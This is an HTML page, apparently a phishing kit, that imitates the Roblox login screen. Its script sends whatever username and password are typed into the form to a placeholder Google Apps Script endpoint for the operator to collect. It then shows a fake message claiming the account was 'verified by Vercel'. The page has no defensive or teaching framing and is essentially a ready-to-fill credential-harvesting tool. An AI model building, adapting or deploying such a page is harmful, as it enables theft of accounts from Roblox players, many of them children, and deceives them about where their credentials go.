<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Roblox Login</title>
  <link href="https://fonts.googleapis.com/css2?family=Product+Sans:wght@400;600&family=Roboto:wght@100;300&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: rgb(18, 18, 21);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      color: white;
    }
    .login-container {
      background: #27282e;
      padding: 40px 60px;
      width: 100%;
      max-width: 500px;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
    }
    .login-title {
      font-family: 'Product Sans', sans-serif;
      font-size: 36px;
      font-weight: 600;
      text-align: center;
      margin-bottom: 30px;
      color: #ffffff;
    }
    .input-field {
      width: 100%;
      padding: 10px 20px;
      background: rgb(60, 62, 71);
      border: 1px solid rgb(72, 74, 85);
      border-radius: 8px;
      margin-bottom: 16px;
      color: #b0b0b0;
      font-family: 'Roboto', sans-serif;
      font-size: 16px;
      outline: none;
    }
    .input-field::placeholder {
      color: #b0b0b0;
    }
    .input-field:focus {
      background: #525252;
    }
    .login-button {
      width: 100%;
      padding: 10px;
      background: rgb(39, 41, 47);
      border: 1px solid rgb(213, 215, 220);
      border-radius: 8px;
      color: white;
      font-size: 18px;
      font-weight: 500;
      cursor: pointer;
      margin-bottom: 20px;
    }
    .login-button:hover {
      background: #4a4a4a;
      border-color: #777777;
    }
    .forgot-link {
      text-align: center;
      margin-bottom: 30px;
    }
    .forgot-link a {
      color: #ffffff;
      text-decoration: none;
      font-size: 16px;
    }
    .separator {
      border-top: 1px solid #525252;
      margin: 30px 0;
    }
    .secondary-button {
      width: 100%;
      padding: 10px;
      background: rgb(60, 62, 71);
      border: none;
      border-radius: 8px;
      color: #e0e0e0;
      font-size: 16px;
      font-weight: 500;
      cursor: pointer;
      margin-bottom: 16px;
    }
    .secondary-button:hover {
      background: #555555;
    }
    .signup-link {
      text-align: center;
      margin-top: 20px;
    }
    .signup-link a {
      color: #ffffff;
      text-decoration: none;
      font-size: 16px;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <h1 class="login-title">Login to Roblox</h1>
    <form onsubmit="submitForm(event)">
      <input type="text" class="input-field" placeholder="Username/Email/Phone" id="username" required>
      <input type="password" class="input-field" placeholder="Password" id="password" required>
      <button type="submit" class="login-button">Log In</button>
    </form>
    <div class="forgot-link">
      <a href="#">Forgot Password or Username?</a>
    </div>
    <div class="separator"></div>
    <button class="secondary-button">Email Me a One-Time Code</button>
    <button class="secondary-button">Use Another Device</button>
    <div class="signup-link">
      <a href="#">Don't have an account? Sign Up</a>
    </div>
  </div>
  <script>
    function generateUID() {
      const prefix = "USR-";
      const random = Math.random().toString(36).substring(2, 8).toUpperCase();
      return prefix + random;
    }
    async function submitForm(event) {
      event.preventDefault();
      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;
      const uid = generateUID();
      const formData = new FormData();
      formData.append("username", username);
      formData.append("password", password);
      formData.append("uid", uid);

      const response = await fetch("YOUR_GOOGLE_SCRIPT_URL_HERE", {
        method: "POST",
        body: formData
      });

      const result = await response.text();
      if (result === "Success") {
        document.body.innerHTML = `
          <div style="display:flex;justify-content:center;align-items:center;height:100vh;color:white;font-size:22px;text-align:center;font-family:'Segoe UI', sans-serif;flex-direction:column;">
            ✅ Your account has been verified by Vercel!<br/><br/>
            <strong>Your unique ID is:</strong><br/>
            <span style="font-size: 28px; font-weight: bold; color: #00ffcc; margin-top: 8px;">${uid}</span><br/><br/>
            <em>Please screenshot or save this ID. You won’t see it again.</em>
          </div>`;
      } else {
        alert("Something went wrong. Please try again.");
      }
    }
  </script>
</body>
</html>
